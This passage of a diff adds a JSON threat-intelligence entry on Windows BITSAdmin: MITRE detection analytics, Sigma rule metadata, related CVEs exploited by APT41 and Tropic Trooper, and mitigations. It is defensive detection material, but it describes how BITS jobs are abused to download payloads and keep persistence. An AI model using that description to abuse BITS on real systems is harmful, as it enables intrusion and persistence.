+                "data_component": "Process Creation",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=1"
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "technique": "T1197",
+        "id": "DET0098",
+        "name": "Detect abuse of Windows BITS Jobs for download, execution and persistence",
+        "url": "https://attack.mitre.org/detectionstrategies/DET0098",
+        "analytics": [
+          {
+            "id": "AN0274",
+            "description": "Behavioral chain: (1) An actor creates or modifies a BITS job via bitsadmin.exe, PowerShell BITS cmdlets, or COM; (2) the job performs HTTP(S)/SMB network transfers while the owning user is logged on; (3) upon job completion/error, BITS launches a notify command (SetNotifyCmdLine) from svchost.exe -k netsvcs -s BITS, often establishing persistence by keeping long-lived jobs. The strategy correlates process creation, command/script telemetry, BITS-Client operational events, and network connections initiated by BITS.",
+            "log_sources": [
+              {
+                "data_component": "Process Creation",
+                "name": "WinEventLog:Security",
+                "channel": "EventCode=4688"
+              },
+              {
+                "data_component": "Network Connection Creation",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=3, 22"
+              },
+              {
+                "data_component": "Command Execution",
+                "name": "WinEventLog:PowerShell",
+                "channel": "EventCode=4103, 4104, 4105, 4106"
+              },
+              {
+                "data_component": "Service Creation",
+                "name": "WinEventLog:System",
+                "channel": "EventCode=7036"
+              }
+            ]
+          }
+        ]
+      }
+    ],
+    "sigma_rules": [
+      {
+        "title": "File Download Via Bitsadmin",
+        "id": "d059842b-6b9d-4ed1-b5c3-5b89143c6ede",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_bitsadmin_download.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1036.003",
+          "T1105",
+          "T1197"
+        ]
+      },
+      {
+        "title": "Suspicious Download From Direct IP Via Bitsadmin",
+        "id": "99c840f2-2012-46fd-9141-c761987550ef",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_bitsadmin_download_direct_ip.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1036.003",
+          "T1197"
+        ]
+      },
+      {
+        "title": "Suspicious Download From File-Sharing Website Via Bitsadmin",
+        "id": "8518ed3d-f7c9-4601-a26c-f361a4256a0c",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_bitsadmin_download_file_sharing_domains.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1036.003",
+          "T1105",
+          "T1197"
+        ]
+      },
+      {
+        "title": "File With Suspicious Extension Downloaded Via Bitsadmin",
+        "id": "5b80a791-ad9b-4b75-bcc1-ad4e1e89c200",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_bitsadmin_download_susp_extensions.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1036.003",
+          "T1105",
+          "T1197"
+        ]
+      },
+      {
+        "title": "File Download Via Bitsadmin To A Suspicious Target Folder",
+        "id": "2ddef153-167b-4e89-86b6-757a9e65dcac",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_bitsadmin_download_susp_targetfolder.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1036.003",
+          "T1105",
+          "T1197"
+        ]
+      },
+      {
+        "title": "Monitoring For Persistence Via BITS",
+        "id": "b9cbbc17-d00d-4e3d-a827-b06d03d2380d",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_bitsadmin_potential_persistence.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "process_creation"
+        },
+        "attack": [
+          "T1197"
+        ]
+      },
+      {
+        "title": "Exploited CVE-2020-10189 Zoho ManageEngine",
+        "id": "846b866e-2a57-46ee-8e16-85fa92759be7",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2020/Exploits/CVE-2020-10189/proc_creation_win_exploit_cve_2020_10189.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.001",
+          "T1059.003",
+          "T1190"
+        ]
+      },
+      {
+        "title": "Mint Sandstorm - AsperaFaspex Suspicious Process Execution",
+        "id": "91048c0d-5b81-4b85-a099-c9ee4fb87979",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2023/TA/Mint-Sandstorm/proc_creation_win_apt_mint_sandstorm_aspera_faspex_susp_child_process.yml",
+        "level": "critical",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Mint Sandstorm - ManageEngine Suspicious Process Execution",
+        "id": "58d8341a-5849-44cd-8ac8-8b020413a31b",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2023/TA/Mint-Sandstorm/proc_creation_win_apt_mint_sandstorm_manage_engine_susp_child_process.yml",
+        "level": "critical",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Potential Exploitation of GoAnywhere MFT Vulnerability",
+        "id": "6c76b3d0-afe4-4870-9443-ffe6773c5fef",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2025/Exploits/CVE-2025-10035/proc_creation_win_exploit_cve_2025_10035.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.001",
+          "T1133",
+          "T1190"
+        ]
+      },
+      {
+        "title": "Suspicious Child Process of SAP NetWeaver",
+        "id": "5b304bcb-ac33-49d0-87af-fa1b3ca94333",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2025/Exploits/CVE-2025-31324/proc_creation_win_sap_netweaver_susp_child_process.yml",
+        "level": "medium",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.003",
+          "T1190"
+        ]
+      },
+      {
+        "title": "Suspicious Child Process of SolarWinds WebHelpDesk",
+        "id": "8c7f4a2d-3b9e-4f1c-9a6d-2e8f5c3d9a1b",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2025/Exploits/CVE-2025-40551/proc_creation_win_exploit_cve_2025_40551.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1190"
+        ]
+      },
+      {
+        "title": "Potential Exploitation of CrushFTP RCE Vulnerability (CVE-2025-54309)",
+        "id": "0fdc7c7f-c690-4217-9ae3-31f5156eed72",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2025/Exploits/CVE-2025-54309/proc_creation_win_exploit_cve_2025_54309.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.001",
+          "T1059.003",
+          "T1068",
+          "T1190"
+        ]
+      },
+      {
+        "title": "Windows Suspicious Child Process from Node.js - React2Shell",
+        "id": "271de298-cc0e-4842-acd8-079a0a99ea65",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-emerging-threats/2025/Exploits/CVE-2025-55182/proc_creation_win_exploit_cve_2025_55182_susp_nodejs_server_child_process.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "command_line",
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059",
+          "T1190"
+        ]
+      },
+      {
+        "title": "BITS Client BitsProxy DLL Loaded By Uncommon Process",
+        "id": "e700ff14-1bff-4d1d-9438-738dff5f0466",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/image_load/image_load_dll_bitsproxy_load_by_uncommon_process.yml",
+        "level": "low",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "image_load",
+          "product": "windows"
+        },
+        "attack": [
+          "T1197"
+        ]
+      },
+      {
+        "title": "Potentially Suspicious PowerShell Child Processes",
+        "id": "e4b6d2a7-d8a4-4f19-acbd-943c16d90647",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/process_creation/proc_creation_win_powershell_susp_child_processes.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.001"
+        ]
+      },
+      {
+        "title": "Legitimate Application Writing Files In Uncommon Location",
+        "id": "1cf465a1-2609-4c15-9b66-c32dbe4bfd67",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_susp_legitimate_app_dropping_in_uncommon_location.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "file_event"
+        },
+        "attack": [
+          "T1105",
+          "T1218"
+        ]
+      },
+      {
+        "title": "Suspicious BitLocker Access Agent Update Utility Execution",
+        "id": "9f38c1db-e2ae-40bf-81d0-5b68f73fb512",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_baaupdate_susp_child_process.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1021.003",
+          "T1218"
+        ]
+      },
+      {
+        "title": "Suspicious Child Process of Notepad++ Updater - GUP.Exe",
+        "id": "bb0e87ce-c89f-4857-84fa-095e4483e9cb",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_gup_susp_child_process.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1195.002",
+          "T1557"
+        ]
+      },
+      {
+        "title": "Suspicious Shells Spawn by Java Utility Keytool",
+        "id": "90fb5e62-ca1f-4e22-b42e-cc521874c938",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_java_keytool_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Suspicious Child Process Of Manage Engine ServiceDesk",
+        "id": "cea2b7ea-792b-405f-95a1-b903ea06458f",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_java_manageengine_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1102"
+        ]
+      },
+      {
+        "title": "Suspicious Processes Spawned by Java.EXE",
+        "id": "0d34ed8b-1c12-4ff2-828c-16fc860b766d",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_java_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Suspicious MSHTA Child Process",
+        "id": "03cc0c25-389f-4bf8-b48d-11878079f1ca",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_mshta_susp_child_processes.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1218.005"
+        ]
+      },
+      {
+        "title": "Suspicious Child Process Of SQL Server",
+        "id": "869b9ca7-9ea2-4a5a-8325-e80e62f75445",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_mssql_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1190",
+          "T1505.003"
+        ]
+      },
+      {
+        "title": "Suspicious Microsoft OneNote Child Process",
+        "id": "c27515df-97a9-4162-8a60-dc0eeb51b775",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_office_onenote_susp_child_processes.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1566",
+          "T1566.001"
+        ]
+      },
+      {
+        "title": "Suspicious Microsoft Office Child Process",
+        "id": "438025f9-5856-4663-83f7-52f878a70a50",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_office_susp_child_processes.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1047",
+          "T1204.002",
+          "T1218.010"
+        ]
+      },
+      {
+        "title": "Remote Access Tool - ScreenConnect Potential Suspicious Remote Command Execution",
+        "id": "7b582f1a-b318-4c6a-bf4e-66fe49bf55a5",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_remote_access_tools_screenconnect_remote_execution_susp.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "process_creation"
+        },
+        "attack": [
+          "T1219.002"
+        ]
+      },
+      {
+        "title": "Suspicious ShellExec_RunDLL Call Via Ordinal",
+        "id": "8823e85d-31d8-473e-b7f4-92da070f0fc6",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_susp_shellexec_ordinal_execution.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1218.011"
+        ]
+      },
+      {
+        "title": "Suspicious Modification Of Scheduled Tasks",
+        "id": "1c0e41cd-21bb-4433-9acc-4a2cd6367b9b",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_change.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "process_creation"
+        },
+        "attack": [
+          "T1053.005"
+        ]
+      },
+      {
+        "title": "Suspicious Spool Service Child Process",
+        "id": "dcdbc940-0bff-46b2-95f3-2d73f848e33b",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_spoolsv_susp_child_processes.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1068",
+          "T1203"
+        ]
+      },
+      {
+        "title": "LOL-Binary Copied From System Directory",
+        "id": "f5d19838-41b5-476c-98d8-ba8af4929ee2",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_copy_system_dir_lolbin.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1036.003"
+        ]
+      },
+      {
+        "title": "Potentially Suspicious Execution From Parent Process In Public Folder",
+        "id": "69bd9b97-2be2-41b6-9816-fb08757a4d1a",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_execution_from_public_folder_as_parent.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line",
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059",
+          "T1564"
+        ]
+      },
+      {
+        "title": "Suspicious FileFix Execution Pattern",
+        "id": "b5b29e4e-31fa-4fdf-b058-296e7a1aa0c2",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_filefix_execution_pattern.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1204.004"
+        ]
+      },
+      {
+        "title": "Suspicious Process Parents",
+        "id": "cbec226f-63d9-4eca-9f52-dfb6652f24df",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_parents.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "parent_image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1036"
+        ]
+      },
+      {
+        "title": "Windows Shell/Scripting Processes Spawning Suspicious Programs",
+        "id": "3a6586ad-127a-4d3b-a677-1e6eacdf8fde",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_shell_spawn_susp_program.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.001",
+          "T1059.005",
+          "T1218"
+        ]
+      },
+      {
+        "title": "System File Execution Location Anomaly",
+        "id": "e4a6b256-3e47-40fc-89d2-7a477edd6915",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_system_exe_anomaly.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1036"
+        ]
+      },
+      {
+        "title": "Suspicious Process By Web Server Process",
+        "id": "8202070f-edeb-4d31-a010-a26c72ac5600",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_webshell_susp_process_spawned_from_webserver.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1190",
+          "T1505.003"
+        ]
+      },
+      {
+        "title": "Suspicious Processes Spawned by WinRM",
+        "id": "5cc2cda8-f261-4d88-a2de-e9e193c86716",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_winrm_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1190"
+        ]
+      },
+      {
+        "title": "Suspicious Process Created Via Wmic.EXE",
+        "id": "3c89a1e8-0fba-449e-8f1b-8409d6267ec8",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_wmic_susp_process_creation.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1047"
+        ]
+      }
+    ],
+    "other_rules": [
+      "https://raw.githubusercontent.com/splunk/security_content/develop/detections/endpoint/bitsadmin_download_file.yml",
+      "https://raw.githubusercontent.com/splunk/security_content/develop/dev/endpoint/office_product_spawning_bitsadmin.yml",
+      "https://raw.githubusercontent.com/elastic/detection-rules/main/rules_building_block/command_and_control_bitsadmin_activity.toml"
+    ]
+  },
+  "related_CVE": [
+    {
+      "id": "CVE-2017-11882",
+      "description": "Microsoft Office Equation Editor memory corruption (remote code execution). Tropic Trooper exploited it for initial execution, and its backdoor installer then used BITSAdmin to create a job that launched the DLL-hijacked sidebar.exe.",
+      "references": [
+        {
+          "source_name": "Trend Micro Tropic Trooper March 2018",
+          "url": "https://www.trendmicro.com/en_us/research/18/c/tropic-trooper-new-strategy.html"
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-0802",
+      "description": "Microsoft Office Equation Editor memory corruption (remote code execution). Tropic Trooper exploited it alongside CVE-2017-11882, and its backdoor installer then used BITSAdmin to create a job that launched sidebar.exe.",
+      "references": [
+        {
+          "source_name": "Trend Micro Tropic Trooper March 2018",
+          "url": "https://www.trendmicro.com/en_us/research/18/c/tropic-trooper-new-strategy.html"
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-10189",
+      "description": "Zoho ManageEngine Desktop Central remote code execution. APT41 exploited it and used BITSAdmin to download install.bat, which installed a Cobalt Strike BEACON loader.",
+      "references": [
+        {
+          "source_name": "FireEye APT41 March 2020",
+          "url": "https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"
+        }
+      ]
+    }
+  ],
+  "mitigations": [
+    {
+      "id": "M1037",
+      "name": "Filter Network Traffic",
+      "technique": "T1048.003",
+      "description": "Enforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols, instead of all systems within a network."
+    },
+    {
+      "id": "M1031",
+      "name": "Network Intrusion Prevention",
+      "technique": "T1048.003",
+      "description": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level."
+    },
+    {
+      "id": "M1030",
+      "name": "Network Segmentation",
+      "technique": "T1048.003",
+      "description": "Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network."
+    },
+    {
+      "id": "M1057",
+      "name": "Data Loss Prevention",
+      "technique": "T1048.003",
+      "description": "Data loss prevention can detect and block sensitive data being sent over unencrypted protocols."
+    },
+    {
+      "id": "M1031",
+      "name": "Network Intrusion Prevention",
+      "technique": "T1105",
+      "description": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools."
+    },
+    {
+      "id": "M1037",
+      "name": "Filter Network Traffic",
+      "technique": "T1105",
+      "description": "Use network filtering to block outbound traffic from compromised systems to unapproved external destinations. Restricting access to known, trusted IP addresses and protocols can prevent attackers from downloading malicious tools or payloads onto compromised servers after gaining initial access."
+    },
+    {
+      "id": "M1031",
+      "name": "Network Intrusion Prevention",
+      "technique": "T1570",
+      "description": "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions."
+    },
+    {
+      "id": "M1037",
+      "name": "Filter Network Traffic",
+      "technique": "T1570",
+      "description": "Consider using the host firewall to restrict file sharing communications such as SMB."
+    },
+    {
+      "id": "M1018",
+      "name": "User Account Management",
+      "technique": "T1197",
+      "description": "Consider limiting access to the BITS interface to specific users or groups."
+    },
+    {
+      "id": "M1028",
+      "name": "Operating System Configuration",
+      "technique": "T1197",
+      "description": "Consider reducing the default BITS job lifetime in Group Policy or by editing the JobInactivityTimeout and MaxDownloadTime Registry values in HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\BITS."
+    },
+    {
+      "id": "M1037",
+      "name": "Filter Network Traffic",
+      "technique": "T1197",
+      "description": "Modify network and/or host firewall rules, as well as other network controls, to only allow legitimate BITS traffic."
+    }
+  ],
+  "additional_mitigations": [
+    "Consider reducing the default BITS job lifetime in Group Policy or by editing the JobInactivityTimeout and MaxDownloadTime Registry values in HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\BITS.",
+    "Enforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols instead of all systems within a network."
+  ],
+  "references": [
+    "https://attack.mitre.org/software/S0190",
+    "https://app.tidalcyber.com/software/52a20d3d-1edd-4f17-87f0-b77c67d260b4-BITSAdmin",
+    "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
+    "https://strontic.github.io/xcyclopedia/library/bitsadmin.exe-01AAB62D5799F75B0D69EB29C1CA6855.html"
+  ],
+  "sources": {
+    "attack": "MITRE ATT&CK Enterprise v20.0",
+    "sigma": "SigmaHQ commit 7d8b152a5fc062ebd309f62ae4d8276aca2786af (rules under DRL 1.1)"
+  }
+}
